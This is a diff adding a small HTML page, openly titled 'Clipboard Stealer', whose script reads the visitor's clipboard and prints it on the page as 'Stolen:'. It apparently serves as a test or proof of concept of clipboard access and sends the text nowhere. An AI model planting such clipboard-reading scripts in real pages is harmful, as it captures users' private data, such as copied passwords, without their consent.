@@ -1,0 +1,18 @@
+<html>
+<head>
+<title>Clipboard Stealer</title>
+</head>
+<body>
+<script>
+try {
+    navigator.clipboard.readText().then(function(text) {
+        document.write('Stolen: ' + text);
+    }).catch(function(e) {
+        document.write('Error: ' + e);
+    });
+} catch (e) {
+    document.write('Error: ' + e);
+}
+</script>
+</body>
+</html>
